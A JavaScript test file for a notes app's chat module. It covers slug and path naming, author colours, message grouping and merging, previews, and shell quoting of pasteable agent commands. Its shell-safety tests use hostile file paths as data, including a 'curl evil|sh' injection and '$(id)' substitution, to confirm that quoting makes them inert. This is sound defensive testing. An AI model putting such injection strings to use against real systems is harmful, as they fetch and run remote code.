import { describe, it, expect } from 'vitest';
import {
  slugify, chatPathFor, colorForAuthor, AUTHOR_COLORS, isOwnMessage,
  groupMessages, mergeMessages, agentInstructions, plainPreview, shellQuote, isChatDoc,
} from '../chat.js';

describe('chat naming', () => {
  it('slugifies a channel name into a shell-safe filename', () => {
    expect(slugify('Release Coordination — Q4!')).toBe('release-coordination-q4');
    expect(slugify('Café déjà vu')).toBe('cafe-deja-vu');
    expect(slugify('   ')).toBe('chat');
  });
  it('puts a new chat in the folder it was given', () => {
    expect(chatPathFor('Team Sync')).toBe('Chats/team-sync.md');
    expect(chatPathFor('Team Sync', '/ops/rooms/')).toBe('ops/rooms/team-sync.md');
    expect(chatPathFor('Team Sync', '')).toBe('team-sync.md');
  });
});

describe('author colours', () => {
  it('is stable per name and always a theme token', () => {
    expect(colorForAuthor('claude-api')).toBe(colorForAuthor('claude-api'));
    for (const n of ['a', 'bob', 'claude-api', '']) expect(AUTHOR_COLORS).toContain(colorForAuthor(n));
  });
});

describe('own messages', () => {
  it('is mine only under my current posting name', () => {
    // multi mode, posting as my account
    expect(isOwnMessage({ author: 'ahsan' }, 'ahsan', 'ahsan')).toBe(true);
    // multi mode, posting under a label
    expect(isOwnMessage({ author: 'pm', via: 'ahsan' }, 'ahsan', 'pm')).toBe(true);
    // an agent on my token is not me
    expect(isOwnMessage({ author: 'claude-a', via: 'ahsan' }, 'ahsan', 'ahsan')).toBe(false);
    // single mode: no account, no via
    expect(isOwnMessage({ author: 'admin' }, null, 'admin')).toBe(true);
    expect(isOwnMessage({ author: 'claude-a' }, null, 'admin')).toBe(false);
    expect(isOwnMessage({ author: 'bob' }, 'ahsan', 'ahsan')).toBe(false);
  });
});

describe('grouping', () => {
  it('starts a new group on a new author or a long gap', () => {
    const g = groupMessages([
      { n: 1, author: 'a', time: '2026-10-02T10:00:00Z' },
      { n: 2, author: 'a', time: '2026-10-02T10:01:00Z' },
      { n: 3, author: 'b', time: '2026-10-02T10:02:00Z' },
      { n: 4, author: 'b', time: '2026-10-02T11:00:00Z' },
    ]);
    expect(g.map((m) => m.startsGroup)).toEqual([true, false, true, true]);
  });
});

describe('merging polled messages', () => {
  it('never duplicates a message the poll and the send both delivered', () => {
    const cur = [{ n: 1 }, { n: 2 }];
    expect(mergeMessages(cur, [{ n: 2 }, { n: 3 }]).map((m) => m.n)).toEqual([1, 2, 3]);
    expect(mergeMessages(cur, [])).toBe(cur);
  });
});

describe('agent instructions', () => {
  it('are pasteable — no <angle-bracket> placeholders', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md');
    expect(s).not.toMatch(/[<>]/);
    expect(s).toContain('mdnest chat wait @mini/notes/Chats/team.md --after 1');
  });
});

describe('list preview', () => {
  it('shows text, not markdown markers', () => {
    expect(plainPreview('Thanks. **Shipping** at 5pm — `release/v4.6.0`.')).toBe('Thanks. Shipping at 5pm — release/v4.6.0.');
    expect(plainPreview('see [the doc](x.md)\n\n```js\nx()\n```')).toBe('see the doc [code]');
  });
});

describe('shell safety of the agent snippet', () => {
  it('quotes a hostile chat path into one inert word', () => {
    const s = agentInstructions('', 'notes', "x;curl evil|sh;it's.md");
    expect(s).toContain(`mdnest chat read 'notes/x;curl evil|sh;it'\\''s.md'`);
  });
  it('leaves an ordinary path readable', () => {
    expect(shellQuote('@mini/notes/Chats/team-sync.md')).toBe('@mini/notes/Chats/team-sync.md');
    expect(shellQuote('notes/Chats/q4 plan.md')).toBe("'notes/Chats/q4 plan.md'");
  });
  it('round-trips through a real shell', async () => {
    const { execFileSync } = await import('node:child_process');
    const hostile = "a;echo PWNED|cat;$(id)`id`'b.md";
    const out = execFileSync('sh', ['-c', `printf %s ${shellQuote(hostile)}`]).toString();
    expect(out).toBe(hostile);
  });
});

describe('isChatDoc (the editor lock and the tree redirect depend on it)', () => {
  it('matches the backend: leading frontmatter with mdnest-chat: true', () => {
    expect(isChatDoc('---\nmdnest-chat: true\ntitle: T\n---\n\nhi')).toBe(true);
    expect(isChatDoc('\uFEFF---\r\ntitle: T\r\nmdnest-chat: "true"\r\n---\r\n')).toBe(true);
  });
  it('does not match a note the Live editor already flattened', () => {
    // exactly what Live turned a chat into before chat notes were locked
    expect(isChatDoc('***\n\nmdnest-chat: true\ntitle: myCustomChat\n-------------------\n')).toBe(false);
    expect(isChatDoc('---\nmdnest-chat: false\n---\n')).toBe(false);
    expect(isChatDoc('# mdnest-chat: true')).toBe(false);
  });
});
